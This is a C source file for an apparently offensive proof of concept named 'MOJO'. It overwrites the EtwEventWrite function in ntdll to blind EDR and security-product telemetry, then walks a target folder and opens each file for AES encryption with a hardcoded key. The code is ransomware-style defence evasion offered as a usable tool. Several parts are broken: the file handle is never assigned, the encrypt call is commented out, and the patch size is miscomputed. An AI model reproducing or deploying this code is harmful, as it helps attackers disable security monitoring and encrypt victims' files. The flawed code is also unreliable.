/*
				 MOJO
			Created by S0ns3

PoC which patch the ETW provider function and encrypt all files in target folder.
The patching allow us to disable the ETW providers of an EDR or any security products and perform operations that would be detected by ETW data correlations.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

int mojo_it(BCRYPT_KEY_HANDLE hKey, char * file_path) {

	HANDLE hFile = NULL;

	CreateFile((LPCWSTR)file_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {

		printf("[!] Failed to open a file\n\n");
		return 1;

	}

	printf("[*] Handle recieved to the file\n\n");



	//BCryptEncrypt(hKey, )

	return 0;

}


int initiate_mojo(char * targetDir) {
		
	HANDLE hFind;
	WIN32_FIND_DATAA data;
	BCRYPT_KEY_HANDLE hKey = NULL;
	PUCHAR pbKeyObject = NULL;
	ULONG cdKeyObject = sizeof(PUCHAR);
	PUCHAR pbSecret[1024] = { (PUCHAR)TEXT("crypto_sonse") };
	BCRYPT_ALG_HANDLE hAlgoProvider = NULL;

	BCryptOpenAlgorithmProvider(&hAlgoProvider, BCRYPT_AES_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);

	BCryptGenerateSymmetricKey(hAlgoProvider, &hKey, pbKeyObject, cdKeyObject, pbSecret[0], sizeof(pbSecret), 0);

	// Crypto Initialization:
	if (hKey != NULL && pbKeyObject == NULL) {

		printf("[*] Crpto initialization failed");
		return 10;

	}

	// Enumarteing target Folder
	hFind = FindFirstFileA((LPCSTR)targetDir, &data);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			printf("%s\n", data.cFileName);
			if (data.dwFileAttributes == 0x10) {

				printf("[!] Dont get into dir XD\n\n");

			}
			else {

				printf("[+] Encrypting File\n\n");

				int res = mojo_it(hKey, data.cFileName);

				if (res != 0) {

					printf("[!] Error While Encrypting: %s\n", data.cFileName);

				}

			}
		} while (FindNextFileA(hFind, &data));

		FindClose(hFind);
	}

	return 0;

}


int deploy_patch(unsigned char patch[]) {

	HANDLE hProcess;
	HMODULE ntdll;
	LPCVOID etwEventWrite_addr;
	MEMORY_BASIC_INFORMATION lpBuffer;

	hProcess = GetCurrentProcess();

	ntdll = GetModuleHandleA("ntdll");
	etwEventWrite_addr = GetProcAddress(ntdll, "EtwEventWrite");

	if (etwEventWrite_addr != NULL) {

		printf("[+] Address of EtwEventWrite in memory: %p\n", etwEventWrite_addr);

	}

	if (!VirtualQueryEx(hProcess, etwEventWrite_addr, &lpBuffer, sizeof(MEMORY_BASIC_INFORMATION))) {

		printf("[!] Query Protection of EtwEventWrite has been failed - exit\n");
		printf("[!] Get Last Error Code: %x\n", GetLastError());

		return 1;

	}
	printf("[*] Memory region base address: %p\n", lpBuffer.BaseAddress);

	printf("[*] Current protection of EtwEventWrite memory space: %x\n", lpBuffer.Protect);
	printf("[*] Changing Page Protection to 0x40\n");

	if (VirtualProtect((LPVOID)etwEventWrite_addr, lpBuffer.RegionSize, 0x40, &lpBuffer.Protect)) {

		printf("[+] Region is now writable\n");

	}

	else {

		printf("[!] Error changing protection of memory region\n");
		printf("[!] Get Last Error Code: %x\n", GetLastError());

		return 2;
	}

	if (memcpy_s((void*)etwEventWrite_addr, lpBuffer.RegionSize, patch, sizeof(patch)) == 0) {

		printf("[+] Patch has been applied on ntdll -> EtwEventWrite\n");

	}
	else {

		printf("[!] Patching Failed!");

	}

	printf("Hit me\n");
	getchar();

	return 0;
}


int main(int argc, char** argv) {

	printf("[+] Patching ETW to deploy payload [+]\n[=] Written By S0ns3 [=]\n");

	if (argc < 2) {

		printf("[!] Invalid arguments\n[*] Usage: Mojo.exe <TargetFolder>\n");
		return 1;

	}

	char* pathTargetDir = argv[1];

	unsigned char patch[] = {
		0x90,
		0x90,
		0xc3
	};

	int res_patch = 0;
	res_patch = deploy_patch(patch);

	if (res_patch == 0) {
		
		printf("[+] Patching EtwEventWrite successfuly\n[*] Deploying PoC Payload\n");
		
		initiate_mojo(pathTargetDir);
	}

	else {

		printf("[!] Patching Failed\n");

		printf("Hit me\n");
		getchar();

		return 1;
	}

	return 0;

}
